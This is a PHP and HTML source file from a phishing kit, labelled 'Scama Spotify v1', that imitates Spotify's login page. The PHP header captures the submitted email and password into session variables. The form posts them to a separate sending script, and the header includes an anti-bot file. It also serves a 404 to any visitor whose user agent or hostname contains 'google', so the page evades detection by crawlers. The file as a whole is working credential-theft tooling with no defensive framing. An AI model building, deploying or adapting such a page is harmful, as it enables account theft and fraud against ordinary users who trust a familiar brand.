<?php   
/*
 $$$$$$\  $$$$$$$\   $$$$$$\  $$\   $$\      $$$$$$$$\ $$\   $$\ 
$$  __$$\ $$  __$$\ $$  __$$\ $$$\  $$ |     \__$$  __|$$$\  $$ |
$$ /  $$ |$$ |  $$ |$$ /  $$ |$$$$\ $$ |        $$ |   $$$$\ $$ |
$$$$$$$$ |$$$$$$$  |$$ |  $$ |$$ $$\$$ |$$$$$$\ $$ |   $$ $$\$$ |
$$  __$$ |$$  __$$< $$ |  $$ |$$ \$$$$ |\______|$$ |   $$ \$$$$ |
$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |\$$$ |        $$ |   $$ |\$$$ |
$$ |  $$ |$$ |  $$ | $$$$$$  |$$ | \$$ |        $$ |   $$ | \$$ |
\__|  \__|\__|  \__| \______/ \__|  \__|        \__|   \__|  \__|
                                                                 
#==========================================#
#             Scama Spotify v1             #
#       facebook: fb.com/amyr.gov.tn       #
#==========================================#

 $$$$$$\   $$$$$$\    $$\   $$$$$$\  
$$  __$$\ $$$ __$$\ $$$$ | $$  __$$\ 
\__/  $$ |$$$$\ $$ |\_$$ | $$ /  $$ |
 $$$$$$  |$$\$$\$$ |  $$ | \$$$$$$$ |
$$  ____/ $$ \$$$$ |  $$ |  \____$$ |
$$ |      $$ |\$$$ |  $$ | $$\   $$ |
$$$$$$$$\ \$$$$$$  /$$$$$$\\$$$$$$  |
\________| \______/ \______|\______/ 
*/                                                     
session_start();
error_reporting(0);
$_SESSION['_login_email_']    = $_POST['signin_email'];
$_SESSION['_login_password_'] = $_POST['signin_password'];
include "../../../ARONXBOT/XSPOTIFYXBOT.php";
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
<meta charset="utf-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<title>Login - Spotify</title>
<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0"/>
<link rel="icon" href="../../lib/img/spot.ico">
<link href="https://accounts.scdn.co/css/index.815c601ede0bda3f6d4b.css" media="screen" rel="stylesheet">
<script type="text/javascript" async="" src="https://www.gstatic.com/recaptcha/api2/v1550471573786/recaptcha__fr.js"></script><script async="" src="//www.google-analytics.com/analytics.js"></script>
<meta ng-non-bindable="" sp-bootstrap-data="{&quot;phoneFeatureEnabled&quot;:false,&quot;user&quot;:false,&quot;BON&quot;:[&quot;0&quot;,&quot;0&quot;,-1506835902]}">
</head>
<body ng-controller="LoginController" class="ng-scope">
<div ng-include="template" class="ng-scope"><div sp-header="" class="ng-scope"><div class="head ">
<a class="spotify-logo" tabindex="-1" title="Spotify"></a>
</div>
</div>
<div class="container-fluid login ng-scope">
<div class="content">
<div class="row ng-scope" ng-if="showContinueLabel">
<div class="col-xs-12 text-center">
<span id="login-to-continue" class="h5 ng-binding">To continue, log in to Spotify.</span>
</div>
</div>
<form method="post" action="xSND.php" id="form" class="idform">
<div class="row" ng-class="{'has-error': (accounts.username.$dirty &amp;&amp; accounts.username.$invalid)}">
<div class="col-xs-12">
<label for="login-username" class="control-label sr-only ng-binding">
Email address or username
</label>
<input ng-model="form.username" type="text" class="form-control input-with-feedback ng-pristine ng-valid-sp-disallow-chars ng-empty ng-invalid ng-invalid-required ng-touched" name="signin_email" id="signin_email" placeholder="Email address or username" required="" sp-disallow-chars=":%&amp;'`?&quot;" sp-disallow-chars-model="usernameDisallowedChars" autocapitalize="off" autocomplete="off" autocorrect="off" autofocus="autofocus" ng-trim="false">
</div>
</div>
<div class="row" ng-class="{'has-error': (accounts.password.$dirty &amp;&amp; accounts.password.$invalid)}">
<div class="col-xs-12">
<label for="login-password" class="control-label sr-only ng-binding">
Password
</label>
<input ng-model="form.password" type="password" class="form-control input-with-feedback ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required" name="signin_password" id="signin_password" placeholder="Password" required="" autocomplete="off" ng-trim="false">
</div>
</div>
<div class="row row-submit">
<div class="col-xs-12 col-sm-6">
<div class="checkbox">
<label class="ng-binding">
<input ng-model="form.remember" type="checkbox" name="remember" id="login-remember" class="ng-pristine ng-untouched ng-valid ng-not-empty">
Remember me
<span class="control-indicator"></span>
</label>
</div>
</div>
<div class="col-xs-12 col-sm-6">
<button class="btn btn-block btn-green ng-binding" id="login-button" ng-click="onLoginClick($event)">Log In</button>
</div>
</div>
</form>
<div class="row">
<div class="col-xs-12 text-center">
<p>
<a id="reset-password-link" ng-href="#" analytics-on="click" analytics-category="Login View" analytics-event="Forgot Button" analytics-label="" class="ng-binding" href="#">Forgot your password?</a>
</p>
</div>
</div>
<div id="sign-up-section">
<div class="row">
<div class="col-xs-12">
<div ng-controller="SignUpController" class="ng-scope">
<div ng-include="'signup.ngt'" class="ng-scope"></div>
</div>
</div>
</div>
</div>
<div class="row">
<div class="col-xs-12">
<div class="divider"></div>
<p class="text-muted disclaimer text-center ng-binding" ng-bind-html="'loginTermsOfService' | localize:termsAndConditionsUrl:privacyPolicyUrl">If you click 'Log in' and are not a Spotify user, you will be got error and you agree to Spotify's<a href="#" >Terms &amp; Conditions</a> and <a href="#" >Privacy Policy</a>.</p>
</div>
</div>
</div>
</div>
</div>
<div></div>
</body>
</html>